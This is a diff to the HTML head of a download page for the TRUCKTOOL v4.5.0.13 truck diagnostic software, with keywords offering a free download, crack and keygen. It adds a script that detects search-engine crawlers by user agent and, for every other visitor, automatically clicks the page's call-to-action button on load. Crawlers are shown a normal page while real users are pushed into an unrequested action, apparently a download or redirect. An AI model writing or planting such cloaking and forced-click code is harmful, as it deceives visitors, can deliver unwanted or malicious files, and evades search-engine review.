@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRUCKTOOL v4.5.0.13 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download TRUCKTOOL v4.5.0.13 07.2024 diagnostic software for Rocla, Mitsubishi, Caterpillar, and more. Multilingual and easy CAN network connection.">
     <meta name="keywords" content="TRUCKTOOL v4.5.0.13, Trucktool diagnostic software, Rocla AGV diagnostics, Mitsubishi truck diagnostics, Caterpillar diagnostic software, Nichiyu diagnostic tool, Uni Carriers diagnostics, TCM truck diagnostics, Jungheinrich diagnostics, PCAN-USB adapter, CAN network connection, compact diagnostic tool, mobile diagnostic adapter, truck maintenance software, diagnostic software July 2024, TRUCKTOOL v4.5.0.13 07.2024, TRUCKTOOL v4.5.0.13 download, TRUCKTOOL 4.5.0.13 free download, TRUCKTOOL diagnostic software 2024, TRUCKTOOL diagnostic software download, TRUCKTOOL diagnostic software crack, TRUCKTOOL diagnostic software keygen, TRUCKTOOL 4.5.0.13 2024 free download, TRUCKTOOL 2024 скачать бесплатно, диагностическое ПО TRUCKTOOL 4.5.0.13, скачать TRUCKTOOL диагностическое ПО, TRUCKTOOL 4.5.0.13 2024 скачать бесплатно, TRUCKTOOL бесплатная загрузка">
     <style>
